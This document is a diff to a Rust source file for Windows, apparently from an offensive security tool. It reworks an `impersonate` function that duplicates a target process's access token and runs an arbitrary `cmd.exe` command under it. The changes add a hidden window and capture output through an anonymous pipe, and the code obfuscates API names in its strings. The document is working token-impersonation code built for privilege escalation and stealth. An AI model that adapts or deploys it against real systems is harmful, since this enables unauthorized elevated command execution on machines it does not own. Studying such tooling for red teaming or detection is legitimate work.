@@ -1,21 +1,22 @@
 use core::time;
-use std::mem::zeroed;
+use std::mem::{zeroed, size_of_val};
 use std::thread;
 use std::io::Error;
 use rand::{distributions::Alphanumeric, Rng};
 use windows_sys::Win32::Security::Authorization::{ConvertStringSecurityDescriptorToSecurityDescriptorA, SDDL_REVISION_1};
-use windows_sys::Win32::Security::{TOKEN_ALL_ACCESS, SECURITY_ATTRIBUTES, InitializeSecurityDescriptor, PSECURITY_DESCRIPTOR};
+use windows_sys::Win32::Security::{TOKEN_ALL_ACCESS, SECURITY_ATTRIBUTES, InitializeSecurityDescriptor, PSECURITY_DESCRIPTOR, SetSecurityDescriptorDacl};
 use windows_sys::Win32::System::SystemServices::{SECURITY_DESCRIPTOR_REVISION, SE_IMPERSONATE_NAME};
+use windows_sys::Win32::UI::WindowsAndMessaging::SW_HIDE;
 use std::ffi::c_void;
-use windows_sys::Win32::Foundation::{INVALID_HANDLE_VALUE, FALSE, STILL_ACTIVE};
+use windows_sys::Win32::Foundation::{INVALID_HANDLE_VALUE, FALSE, STILL_ACTIVE, TRUE};
 use windows_sys::Win32::Storage::FileSystem::{PIPE_ACCESS_DUPLEX, ReadFile};
 use windows_sys::core::PCSTR;
 use std::ptr::null_mut;
 use obfstr::obfstr;
-use windows_sys::Win32::System::Pipes::{CreateNamedPipeA, PIPE_TYPE_MESSAGE, ConnectNamedPipe, PIPE_WAIT};
+use windows_sys::Win32::System::Pipes::{CreateNamedPipeA, PIPE_TYPE_MESSAGE, ConnectNamedPipe, PIPE_WAIT, PIPE_NOWAIT, CreatePipe};
 use windows_sys::{Win32::{Foundation::{HANDLE, CloseHandle}, Security::{SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, LookupPrivilegeValueW, AdjustTokenPrivileges, TOKEN_PRIVILEGES, DuplicateTokenEx, SecurityImpersonation, TokenPrimary, SecurityDelegation, SecurityAnonymous, SecurityIdentification}}, core::PWSTR};
 use windows_sys::Win32::System::{Threading::{PROCESS_QUERY_INFORMATION, CreateProcessWithTokenW, STARTUPINFOW, PROCESS_INFORMATION}, SystemServices::{SE_DEBUG_NAME, MAXIMUM_ALLOWED, SECURITY_MANDATORY_LOW_RID, SECURITY_MANDATORY_MEDIUM_RID, SECURITY_MANDATORY_HIGH_RID, SECURITY_MANDATORY_SYSTEM_RID, SECURITY_MANDATORY_UNTRUSTED_RID, SECURITY_MANDATORY_PROTECTED_PROCESS_RID}};
-use windows_sys::Win32::System::Threading::{OpenProcess, OpenProcessToken, GetCurrentProcess, GetExitCodeProcess, LOGON_WITH_PROFILE};
+use windows_sys::Win32::System::Threading::{OpenProcess, OpenProcessToken, GetCurrentProcess, GetExitCodeProcess, LOGON_WITH_PROFILE, STARTF_USESTDHANDLES, STARTF_USESHOWWINDOW, CREATE_NO_WINDOW};
 
 use crate::utils::FIXED_SECURITY_MANDATORY_MEDIUM_PLUS_RID;
 use log::trace;
@@ -105,9 +106,11 @@ pub fn impersonate(pid: u32, command: String) -> Result<bool, String> {
             return Err(format!("{} Error: {}",obfstr!("InitializeSecurityDescriptor"), Error::last_os_error()).to_owned());
         }
 
+        // sa.lpSecurityDescriptor = sd;
+
         trace!("[?] Initialize SECURITY_ATTRIBUTES");
 
-        let ssd = "D:(A;OICI;GA;;;WD)".as_ptr() as *const u8 as PCSTR;
+        let ssd = "D:(A;OICI;GA;;;AU)".as_ptr() as *const u8 as PCSTR;
         if ConvertStringSecurityDescriptorToSecurityDescriptorA(ssd, SDDL_REVISION_1, &mut(sa.lpSecurityDescriptor), null_mut()) == 0 {
             CloseHandle(process_handle);
             CloseHandle(token_handle);
@@ -115,31 +118,46 @@ pub fn impersonate(pid: u32, command: String) -> Result<bool, String> {
             return Err(format!("{} Error: {}",obfstr!("ConvertStringSecurityDescriptorToSecurityDescriptorA"), Error::last_os_error()).to_owned());
         }        
         
+        let mut read_pipe: HANDLE = std::mem::zeroed();
+        let mut write_pipe: HANDLE = std::mem::zeroed();
         // spawn NamedPipe
-        let pipe_name: PCSTR = format!("\\\\.\\pipe\\{}\0", pipe_str).as_ptr() as *const u8 as PCSTR;
-        let server_pipe =  CreateNamedPipeA(pipe_name, PIPE_ACCESS_DUPLEX , PIPE_TYPE_MESSAGE | PIPE_WAIT, 10, 16384, 16384,0,&sa);
+        // let pipe_name: PCSTR = format!("\\\\.\\pipe\\{}\0", pipe_str).as_ptr() as *const u8 as PCSTR;
+        // let server_pipe =  CreateNamedPipeA(pipe_name, PIPE_ACCESS_DUPLEX , PIPE_TYPE_MESSAGE | PIPE_WAIT, 10, 16384, 16384,0,&sa);
+        if CreatePipe(&mut read_pipe, &mut write_pipe, &sa, 0) == FALSE {
+            // Handle Error
+            return Err(format!("{} Error: {}",obfstr!("CreatePipe"), Error::last_os_error()).to_owned());
+        }; 
 
-        trace!("[?] Spawned named pipe: {}",format!("\\\\.\\pipe\\{}\0", pipe_str));
+        trace!("[?] Spawned named pipes");
 
-        let si: STARTUPINFOW = std::mem::zeroed();
+        let mut si: STARTUPINFOW = std::mem::zeroed();
         let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
 
-        let mut cmd = (format!("{}{}{}\\{}",obfstr!("cmd.exe /C "),command, obfstr!(" > \\\\.\\pipe"), pipe_str).to_owned() + "\0").encode_utf16().collect::<Vec<u16>>();
+        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+        si.hStdOutput = write_pipe;
+        si.hStdError = write_pipe;
+        si.wShowWindow = SW_HIDE as u16;
+
+        let mut cmd = (format!("{}{}",obfstr!("cmd.exe /C "),command).to_owned() + "\0").encode_utf16().collect::<Vec<u16>>();
+        let working_dir = (format!("{}",obfstr!("C:\\Windows\\System32")).to_owned() + "\0").encode_utf16().collect::<Vec<u16>>();
         trace!("[?] Command to be executed: {:?}",String::from_utf16(&cmd).expect("command"));
-        if CreateProcessWithTokenW(duplicate_token_handle, LOGON_WITH_PROFILE, null_mut(), cmd.as_mut_ptr() as *mut _ as PWSTR, 0,FALSE as *const c_void,FALSE as *const u16,&si , &mut pi) == 0 {
+        if CreateProcessWithTokenW(
+            duplicate_token_handle,
+            LOGON_WITH_PROFILE,
+            null_mut(),
+            cmd.as_mut_ptr() as *mut _ as PWSTR,
+            CREATE_NO_WINDOW,
+            FALSE as *const c_void,
+            working_dir.as_ptr(),
+            &si ,
+            &mut pi
+        ) == 0 {
             CloseHandle(process_handle);
-            CloseHandle(server_pipe);
+            CloseHandle(read_pipe);
+            CloseHandle(write_pipe);
             CloseHandle(token_handle);
             CloseHandle(duplicate_token_handle);
             return Err(format!("{} Error: {}",obfstr!("CreateProcessWithTokenW"), Error::last_os_error()).to_owned());
-        }
-
-        if ConnectNamedPipe(server_pipe, null_mut()) == 0 {
-            CloseHandle(process_handle);
-            CloseHandle(server_pipe);
-            CloseHandle(token_handle);
-            CloseHandle(duplicate_token_handle);
-            return Err(format!("{} Error: {}",obfstr!("ConnectNamedPipe"), Error::last_os_error()).to_owned());
         }
 
         trace!("[?] Process created with id: {}",pi.dwProcessId);
@@ -149,8 +167,8 @@ pub fn impersonate(pid: u32, command: String) -> Result<bool, String> {
         let mut buffer_read = vec![0u8;16384];
         thread::sleep(time::Duration::from_millis(500));
 
+        let mut exit_code = 0u32;
         loop {
-            let mut exit_code = 0u32;
             GetExitCodeProcess(pi.hProcess, &mut exit_code);
             trace!("[?] Process exit code is: {}",exit_code);
             if exit_code as i32 != STILL_ACTIVE {
@@ -160,23 +178,25 @@ pub fn impersonate(pid: u32, command: String) -> Result<bool, String> {
             trace!("[?] Waiting for command to finish");
         }
 
-        trace!("[?] Connected to named pipe");
+        // if ConnectNamedPipe(read_pipe, null_mut()) == 0 {
+        //     CloseHandle(process_handle);
+        //     CloseHandle(read_pipe);
+        //     CloseHandle(write_pipe);
+        //     CloseHandle(token_handle);
+        //     CloseHandle(duplicate_token_handle);
+        //     return Err(format!("{} Error: {}",obfstr!("ConnectNamedPipe"), Error::last_os_error()).to_owned());
+        // }
 
-        // Waiting for process to finish
-        loop {
-            let mut exit_code = 0u32;
-            GetExitCodeProcess(pi.hProcess, &mut exit_code);
-            if exit_code as i32 != STILL_ACTIVE {
-                break;
-            }
-            thread::sleep(time::Duration::from_millis(500));
-            trace!("[?] Waiting for command to finish");
+        if exit_code != 0{
+            return Err(format!("{} {}: {}",obfstr!("Process spawned finish with"), exit_code, Error::last_os_error()).to_owned());
+
         }
 
-        if ReadFile(server_pipe, buffer_read.as_mut_ptr() as *mut c_void, buffer_read.len() as u32, &mut bytes_read, null_mut())  == 0 {
+        if ReadFile(read_pipe, buffer_read.as_mut_ptr() as *mut c_void, buffer_read.len() as u32, &mut bytes_read, null_mut())  == 0 {
             CloseHandle(process_handle);
             CloseHandle(token_handle);
-            CloseHandle(server_pipe);
+            CloseHandle(read_pipe);
+            CloseHandle(write_pipe);
             CloseHandle(duplicate_token_handle);
             return Err(format!("{} Error: {}",obfstr!("ReadFile"), Error::last_os_error()).to_owned());
         }
@@ -184,7 +204,8 @@ pub fn impersonate(pid: u32, command: String) -> Result<bool, String> {
         println!("{}",String::from_utf8_lossy(&mut buffer_read[..(bytes_read as usize)]));
 
         CloseHandle(process_handle);
-        CloseHandle(server_pipe);
+        CloseHandle(read_pipe);
+        CloseHandle(write_pipe);
         CloseHandle(token_handle);
         CloseHandle(duplicate_token_handle);
 
